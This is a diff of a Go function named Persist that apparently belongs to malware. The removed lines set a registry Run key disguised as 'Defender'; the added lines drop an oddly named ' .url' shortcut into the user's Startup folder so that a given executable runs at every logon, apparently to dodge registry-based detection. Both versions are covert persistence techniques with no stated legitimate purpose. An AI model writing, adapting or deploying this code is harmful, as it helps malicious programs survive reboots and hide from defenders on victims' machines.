@@ -1,21 +1,28 @@
 package reg
 
 import (
-	"golang.org/x/sys/windows/registry"
+	"os"
+	"path/filepath"
 )
 
 func Persist(path string) error {
-	k1, err := registry.OpenKey(registry.CURRENT_USER, `SOFTWARE\Microsoft\Windows\CurrentVersion\Run`, registry.ALL_ACCESS)
+	kpath := filepath.Join(os.Getenv("APPDATA"), "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
+	if _, err := os.Stat(kpath); os.IsNotExist(err) {
+		return err
+	}
+
+	kpath = filepath.Join(kpath, " .url")
+	f, err := os.Create(kpath)
 	if err != nil {
 		return err
 	}
 
-	defer k1.Close()
-
-	err = k1.SetStringValue("Defender", path)
-	if err != nil {
+	n, err := f.Write([]byte("\n[InternetShortcut]\nURL=file://" + path))
+	if err != nil && n == 0 {
 		return err
 	}
+
+	defer f.Close()
 
 	return nil
 }
